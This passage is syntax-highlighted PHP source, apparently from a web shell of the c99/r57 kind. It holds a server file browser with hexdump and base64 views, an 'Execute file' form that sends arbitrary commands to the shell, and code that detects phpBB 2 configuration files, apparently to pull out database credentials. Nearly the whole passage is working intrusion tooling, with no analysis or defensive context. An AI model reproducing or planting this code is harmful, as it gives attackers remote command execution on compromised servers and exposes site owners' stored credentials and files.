          <span class="k">echo</span> <span class="s2">&quot; (&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;white=1&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">_blank</span><span class="se">\&quot;</span><span class="s2">&amp;gt;+&amp;lt;/a&amp;gt;) |&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;info&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Information:&amp;lt;/b&amp;gt;&amp;lt;table border=0 cellspacing=1 cellpadding=2&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Path&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Size&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;MD5&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">md5_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="p">;</span>
            <span class="nv">$ow</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
            <span class="nv">$gr</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
            <span class="k">echo</span> <span class="p">(</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
          <span class="p">}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Perms&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=chmod&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Create time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Access time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;MODIFY time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
          <span class="nv">$fi</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;rb&quot;</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$fi</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$fullhexdump</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;FULL HEXDUMP&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$str</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fi</span><span class="p">,</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));}</span>
            <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;HEXDUMP PREVIEW&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$str</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fi</span><span class="p">,</span><span class="nv">$hexdump_lines</span><span class="o">*</span><span class="nv">$hexdump_rows</span><span class="p">);}</span>
            <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="nv">$a0</span> <span class="o">=</span> <span class="s2">&quot;00000000&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$a1</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
            <span class="nv">$a2</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
            <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
              <span class="nv">$a1</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">&quot;%02X&quot;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
              <span class="k">switch</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>  <span class="nv">$a2</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;font&amp;gt;0&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="mi">32</span><span class="o">:</span>
                <span class="k">case</span> <span class="mi">10</span><span class="o">:</span>
                <span class="k">case</span> <span class="mi">13</span><span class="o">:</span> <span class="nv">$a2</span> <span class="o">.=</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">default</span><span class="o">:</span> <span class="nv">$a2</span> <span class="o">.=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
              <span class="p">}</span>
              <span class="nv">$n</span><span class="o">++</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="nv">$hexdump_rows</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span><span class="nv">$a0</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">&quot;%08X&quot;</span><span class="p">,</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
                <span class="nv">$a1</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="nv">$a2</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
              <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table border=1 bgcolor=#666666&amp;gt;&quot;</span><span class="o">.</span>
                 <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=#666666&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$a0</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="o">.</span>
                 <span class="s2">&quot;&amp;lt;td bgcolor=#000000&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$a1</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="o">.</span>
                 <span class="s2">&quot;&amp;lt;td bgcolor=#000000&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$a2</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="o">.</span>
                 <span class="s2">&quot;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="nv">$encoded</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Encode&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
          <span class="p">}</span>
          <span class="k">elseif</span><span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Encode + Chunk&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">chunk_split</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)));</span>
          <span class="p">}</span>
          <span class="k">elseif</span><span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Encode + Chunk + Quotes&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
            <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;!.{1,76}!&quot;</span><span class="p">,</span><span class="s2">&quot;&#39;\&amp;#92;&amp;#48;&#39;.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$encoded</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="k">elseif</span><span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$text</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
            <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Decode&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">)</span> <span class="o">!=</span> <span class="nv">$text</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; (failed)&quot;</span><span class="p">;}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
       <span class="p">}</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">))</span>
       <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea cols=80 rows=10&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
       <span class="p">}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;HEXDUMP:&amp;lt;/b&amp;gt;&amp;lt;nobr&amp;gt; [&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=info&amp;fullhexdump=1&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Full&amp;lt;/a&amp;gt;] [&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=info&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Preview&amp;lt;/a&amp;gt;]&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Base64: &amp;lt;/b&amp;gt;</span>
<span class="s2">            &amp;lt;nobr&amp;gt;[&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=info&amp;base64=1&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Encode&amp;lt;/a&amp;gt;]&amp;nbsp;&amp;lt;/nobr&amp;gt;</span>
<span class="s2">            &amp;lt;nobr&amp;gt;[&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=info&amp;base64=2&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;+chunk&amp;lt;/a&amp;gt;]&amp;nbsp;&amp;lt;/nobr&amp;gt;</span>
<span class="s2">            &amp;lt;nobr&amp;gt;[&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=info&amp;base64=3&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;+chunk+quotes&amp;lt;/a&amp;gt;]&amp;nbsp;&amp;lt;/nobr&amp;gt;</span>
<span class="s2">            &amp;lt;nobr&amp;gt;[&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=info&amp;base64=4&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Decode&amp;lt;/a&amp;gt;]&amp;nbsp;&amp;lt;/nobr&amp;gt;</span>
<span class="s2">            &amp;lt;P&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;html&quot;</span><span class="p">)</span> <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$white</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();}</span>
       <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$white</span><span class="p">)</span> <span class="p">{</span><span class="nx">tpshexit</span><span class="p">();}</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;txt&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;ini&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">parse_ini_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="k">TRUE</span><span class="p">));</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;phpsess&quot;</span><span class="p">)</span> <span class="p">{</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
       <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span>
       <span class="k">echo</span> <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
       <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;exe&quot;</span><span class="p">)</span> <span class="p">{</span>
       <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
       <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
       <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
       <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
       <span class="nv">$rft</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
       <span class="k">foreach</span><span class="p">(</span><span class="nv">$exeftypes</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span>
       <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$rft</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;}</span>
       <span class="p">}</span>
       <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%f%&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$rft</span><span class="p">);</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Execute file:&amp;lt;/b&amp;gt;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&amp;lt;input type=hidden name=act value=cmd&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;Display in text-area&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd_txt</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Execute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;sdb&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$r</span><span class="p">)));</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;code&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="o">.</span><span class="s2">&quot;BB 2.(.*) auto-generated config file&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">))</span> <span class="p">{</span>
          <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$arr</span> <span class="o">==</span> <span class="mi">18</span><span class="p">))</span> <span class="p">{</span>
